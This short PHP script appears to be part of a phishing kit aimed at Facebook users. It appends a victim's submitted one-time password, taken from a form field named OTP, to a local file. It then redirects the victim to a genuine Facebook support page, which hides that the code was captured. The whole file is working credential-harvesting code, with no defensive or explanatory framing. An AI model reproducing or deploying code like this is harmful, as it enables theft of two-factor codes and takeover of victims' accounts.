<?php

file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/support/forms/flow_view?id=342509036134712&refid=69&_rdr');
exit();
